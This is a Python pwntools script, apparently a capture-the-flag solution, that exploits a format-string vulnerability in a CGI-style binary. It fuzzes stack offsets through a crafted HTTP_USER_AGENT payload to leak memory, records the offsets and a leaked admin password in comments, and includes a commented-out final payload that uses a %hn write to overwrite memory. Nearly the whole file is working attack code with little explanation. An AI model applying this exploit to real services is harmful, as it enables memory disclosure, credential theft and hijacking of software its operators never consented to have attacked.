#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sec.bak'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'warn'

# =========================================================
#                       FUZZ ENV
# =========================================================
# found remote AdminPass offset at 325
# found local AdminPass offset at 328
# found both (char *) to string 'brag' at 267 
# found remote workingDir=/home/ctf/ at offset 326
AdminPass = "xbYP3h7Ua94c"
for i in range(0, 400):
    payload = b'A'*1008
    payload += f'%1$p %{i}$s'.encode()

    env = {
        "QUERY_STRING": "",
        "REQUEST_METHOD": "",
        "HTTP_X_DEBUG": "1",
        "AdminPass": "SomethingSecure",
        "HTTP_X_PASSWORD": "unknown",
        "REMOTE_ADDR": "127.0.0.1",
        "HTTP_USER_AGENT": payload
    }

    io = process(exe, env=env)
    try: 
        io.recvuntil(b'User Agent : </h3>')
        leak = io.recvuntil(b'</pre>', drop=True).strip()
        warn('leak-%d: %s', i, leak)
        io.close()
    except BaseException or EOFError:
        io.close()
        pass

# =========================================================
#                      FINAL EXPLOIT
# =========================================================
# payload = b'A'*1008
# payload += f'%27750c%267$hn'.encode()

# env = {
#     "QUERY_STRING": "",
#     "REQUEST_METHOD": "GET",
#     "HTTP_X_DEBUG": "1",
#     "AdminPass": "xbYP3h7Ua94c",
#     "HTTP_X_PASSWORD": "xbYP3h7Ua94c",
#     "CONTENT_LENGTH": "",
#     "workingDir": "/home/kali/",
#     "REMOTE_ADDR": "127.0.0.1",
#     "HTTP_USER_AGENT": payload
# }

# io = process(exe, env=env)
# print(io.recv())

io.interactive()